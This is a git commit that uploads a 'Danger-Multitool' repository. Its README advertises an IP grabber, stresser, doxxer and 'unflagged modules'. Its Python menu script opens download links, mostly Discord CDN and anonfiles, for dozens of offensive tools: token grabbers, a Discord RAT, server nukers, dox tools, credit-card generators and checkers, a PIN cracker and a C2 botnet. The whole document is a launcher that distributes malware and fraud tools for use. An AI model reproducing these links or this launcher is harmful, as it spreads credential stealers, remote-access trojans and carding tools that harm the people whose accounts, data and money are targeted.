f5436722fa0c0b666bbde0c6d6b7c2946bcff1d9
pro <87319769+sh3boot@users.noreply.github.com>
2023-10-12 18:41:01 +0100

    Add files via upload
    Discord server: https://discord.gg/zjUf83MAVN

---
+++ Danger-Multitool-main/README.md
@@ -0,0 +1,47 @@
+![image](https://github.com/xtro0000/Danger-Multitool/assets/145662247/d9602564-1425-4a08-948f-f2f2ffd1072a)
+
+
+
+
+<div align="center">
+    <img src="https://img.shields.io/github/languages/top/addi00000/empyrean?color=%23000000">
+    <img src="https://img.shields.io/github/stars/addi00000/empyrean?color=%23000000&logoColor=%23000000">
+    <br>
+    <img src="https://img.shields.io/github/commit-activity/w/addi00000/empyrean?color=%23000000"> 
+    <img src="https://img.shields.io/github/last-commit/addi00000/empyrean?color=%23000000&logoColor=%23000000">
+    <br>
+    <img src="https://img.shields.io/github/issues/addi00000/empyrean?color=%23000000&logoColor=%23000000">
+    <img src="https://img.shields.io/github/issues-closed/addi00000/empyrean?color=%23000000&logoColor=%23000000">
+    <br>
+</div>
+<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
+
+## Features
+- The best multi tool on market
+- Ip grabber
+- Stresser
+- Doxxer
+- Proxy Support / Proxyless
+- Fully Requests Based Tool
+- Unflagged Modules
+- Unique / Working Modules
+- +30 EPIC Features To Enjoy
+- Spammers, Checkers, Humanizers and more!
+- Frequently Updates
+
+## Install
+
+### Prerequisites
+
+-   Windows 10/11
+-   [Python](https://www.python.org/downloads/release/python-3109/)
+
+### Setup
+
+1. [Download source code zip]
+2. Extract zip
+3. Run `start.bat` To open the file
+
+## License
+
+Danger is licensed under the <a href="https://mit-license.org/">MIT License</a>.
---
+++ Danger-Multitool-main/src/main.py
@@ -0,0 +1,181 @@
+import os, colorama, webbrowser, time; from colorama import *
+
+os.system('color D')
+
+os.system('cls & title Made by danger ')
+
+menu = f"""
+                                              ██████╗  █████╗ ██████╗ ██╗  ██╗    ██████╗ ██╗██████╗ ██████╗
+                                              ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██╔══██╗██║██╔══██╗██╔══██╗
+                                              ██║  ██║███████║██████╔╝█████╔╝     ██████╔╝██║██████╔╝██║  ██║
+                                              ██║  ██║██╔══██║██╔══██╗██╔═██╗     ██╔══██╗██║██╔══██╗██║  ██║
+                                              ██████╔╝██║  ██║██║  ██║██║  ██╗    ██████╔╝██║██║  ██║██████╔╝
+                                              ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═════╝ ╚═╝╚═╝  ╚═╝╚═════╝
+                                              
+                                                                                
+                │━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━│
+                │[1]discord_token.genV3       │[18]Velocity-Grabber(PIAD)  │[35]TWITCH_Follower_Bot              │[52]DISCORDEN                   │
+                │[2]Discord_Nitro_Generator   │[19]stresser                │[36]Twitch_Token_Gen                 │[53]ID TO TOKEN                 │
+                │[4]storecard_gen             │[21]Tiktok_View_Bot         │[38]roblox_pin_cracker               │[54]Discord Promo Gen           │
+                │[5]amazon_giftcared_gen      │[22]Giftcard_Gen            │[39]Account Gen                      │[55]ValidCardCredit Card Gen    │
+                │[6]boost_bot                 │[23]RexNuker                │[40]Twitch_Token_Gen/Checker         │[56]Zeogen                      │ 
+                │[7]Fake-Verification-Bot-main│[24]LithiumNuker            │[41]CC Gen                           │[57]Fake ETH Wallet Miner       │
+                │[8]Pinger                    │[25]KyaniteNuker            │[42]CC Checker                       │[58]Fake BTC Wallet Miner       │
+                │[9]Token_Nuke                │[26]J4J_Discord_Bot         │[43]Nitro Gen                        │[59]IP Grabber PY               │
+                │[10]putty                    │[27]iplookup                │[44]Nitro gen 2                      │[60]Insta Checker               │
+                │[11]NaamsPanel               │[28]Hazard_Nuker            │[45]Nitro Gen 3                      │[61]Fake Discord IP Puller      │
+                │[12]dox_tool                 │[29]GangNuker               │[46]Random Multi Tool                │[62]TikTok Checker              │
+                │[13]Dox_tool_v2              │[30]empyrean_grabber        │[47]Discord Rat                      │[63]TikTok Autoclaimer          │
+                │[14]Discord.Raidkit.v1       │[31]Discord_Mass_Dm         │[48]csgo Cheats+bypass               │[64]TikTok 4L/4C Checker        │
+                │[15]Discord-Account-Ruiner   │[32]Discord token_gen       │[49]Free VPN                         │[65]Fivem Executor              │
+                │[16]DiscordTokenChecker      │[33]Ascii gen               │[50]Free Windows                     │[66]Despasudo (FIXXEN)          │
+                │[17]Discord_Image_Grabber    │[34]discord-gen-bot         │[51]Discord boost Service PAC        │[67]C2 Botnets IDk Bu ye        │
+                │━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━│
+                                                            
+"""
+
+print(menu)
+
+choice = int(input('    Choose: '))
+
+
+if choice == 1:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1003805238513389628/discord_token.genV3.exe')
+elif choice == 2:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1003805238815359077/Discord_Nitro_Generator.exe')
+elif choice == 3:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1003805239058645072/SteamKeyGen.exe')
+elif choice == 4:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1003805267038851132/storecard_gen.exe')
+elif choice == 5:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004062687749226597/amazon_giftcared_gen.exe ')
+elif choice == 6:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004064849963261982/boost_bot.rar')
+elif choice == 7:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004064896868171887/Fake-Verification-Bot-main.rar')
+elif choice == 8:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004065193833283614/Pinger.bat')
+elif choice == 9:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004065223965167826/Token_Nuke.exe')
+elif choice == 10:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004065296153321522/putty.exe')
+elif choice == 11:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004065316088844440/NaamsPanel.exe')
+elif choice == 12:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004068801572257852/dox_tool.exe')
+elif choice == 13:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004068680851783800/Dox_tool_v2.exe')
+elif choice == 14:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004065580355162222/Discord.Raidkit.v1.3.3.7z')
+elif choice == 15:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004065591361028177/Discord-Account-Ruiner-master.zip')
+elif choice == 16:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004065678313140306/DiscordTokenChecker.rar')
+elif choice == 17:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004067739389939723/Discord_Image_Grabber.py')
+elif choice == 18:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004074435654987896/Velocity-Grabber.rar')
+elif choice == 19:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004078012288999454/stresser.rar')
+elif choice == 20:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004077619937034361/Tiktok_Report_bot.zip')
+elif choice == 21:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004077620201279611/Tiktok_View_Bot.zip')
+elif choice == 22:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004077644184301588/Multi_Giftcard_Gen.rar')
+elif choice == 23:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004077644779884646/RexNuker.zip')
+elif choice == 24:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004077675817750568/LithiumNuker.zip')
+elif choice == 25:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004077701495271514/KyaniteNuker.rar')
+elif choice == 26:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004077711104426084/J4J_Discord_Bot.rar')
+elif choice == 27:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004077727399293019/iplookup.rar')
+elif choice == 28:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004077735456550992/Hazard_Nuker.zip')
+elif choice == 29:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004077747536154624/GangNuker.zip')
+elif choice == 30:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004077754544824342/empyrean_grabber.rar')
+elif choice == 31:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004077767069012088/Discord_Mass_Dm_Tool.zip')
+elif choice == 32:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004080244828946484/token_gen.rar  https://www.mediafire.com/file/kfbg5jabmfey555/node_modules.rar/file')
+elif choice == 33:
+    webbrowser.open('http://patorjk.com/software/taag/#p=display&f=Graffiti&t=Type%20Something%20')
+elif choice == 34:
+    webbrowser.open('https://cdn.discordapp.com/attachments/997154661129793586/998651502145065041/discord-gen-bot-main.rar')
+elif choice == 35:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004101703177601124/TWITCH_Follower_Bot.rar')
+elif choice == 36:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004101719724130374/Twitch_Token_Gen.rar')
+elif choice == 37:
+    webbrowser.open('https://mega.nz/folder/wqQEHbqZ#IBWue8Jv02eumS8PF92SwQ ')
+elif choice == 38:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004103453829771284/roblox_pin_cracker.rar')
+elif choice == 39:
+    webbrowser.open('https://www.a-gen.xyz/')
+elif choice == 40:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1004109090596868219/Twitch_Token_Gen_And_Checker.rar')
+elif choice == 41:
+    webbrowser.open('https://mega.nz/file/gS9DWByZ#UaBB9jqxoFogB7bCh5wb0kgS5Ciu_--DiFxm5eZDxRQ')
+elif choice == 42:
+    webbrowser.open('https://anonfiles.com/mb0dk647yf/cc_checker_py')
+elif choice == 43:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1009428210947203072/Nitro_Generator_and_Checker.rar')
+elif choice == 44:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1009428211282759680/NitroGen.rar')
+elif choice == 45:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1009428211567964191/nitro_gen.rar')
+elif choice == 46:
+    webbrowser.open('https://cdn.discordapp.com/attachments/1000890471721213952/1007027100974329978/ToolHubX.rar')
+elif choice == 47:
+    webbrowser.open('https://github.com/moom825/Discord-RAT-2.0/releases/download/2.0/release.zip')
+elif choice == 48:
+    webbrowser.open('https://ocewut.wixsite.com/my-site/downloads')
+elif choice == 49:
+    webbrowser.open('https://protonvpn.com/')
+elif choice == 50:
+    webbrowser.open('https://mega.nz/file/gKwBGRKQ#JwmK6ESjeKlNNNf6OVr38XQ8JVEIE_VDZKNTYBZe1xU')
+elif choice == 51:
+    webbrowser.open('https://anonfiles.com/G82e1939yf/Boost_Service_PACK_rar')
+elif choice == 52:
+    webbrowser.open('https://discord.gg/zjUf83MAVN')
+elif choice == 53:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1010373139043209226/ID_TOKEN.rar')
+elif choice == 54:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1010373139332603914/promo_gen.rar')
+elif choice == 55:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1010373138757976094/ValidMYCardCredit_Card_Generator.rar')
+elif choice == 56:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1010373714388451358/zeogen.exe')
+elif choice == 57:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1010374172322574427/Fake_ETH_Wallet_Miner.rar')
+elif choice == 58:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1010374258381307975/Light_Miner.v1.py')
+elif choice == 59:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1010374530000224358/ipgrabber.py')
+elif choice == 60:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1010375065751273553/insta_checker.py')
+elif choice == 61:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1010375635719422072/Fake_IP_Puller.bat')
+elif choice == 62:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1010376209223405608/xchecker.rar')
+elif choice == 63:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1010376208854298705/TikTok_AutoClaimer.rar')
+elif choice == 64:
+    webbrowser.open('https://pastebin.com/k6hfM1HH')
+elif choice == 65:
+    webbrowser.open('https://cdn.discordapp.com/attachments/966419814698590308/1010376835034534038/CRDream.dll')
+elif choice == 66:
+    webbrowser.open('https://anonfiles.com/O9pb6a40yf/despasudo_fixxen_rar')
+elif choice == 67:
+    webbrowser.open('https://anonfiles.com/saq26e40y6/C2_botnet_rar')
+
+
+
+
+
+
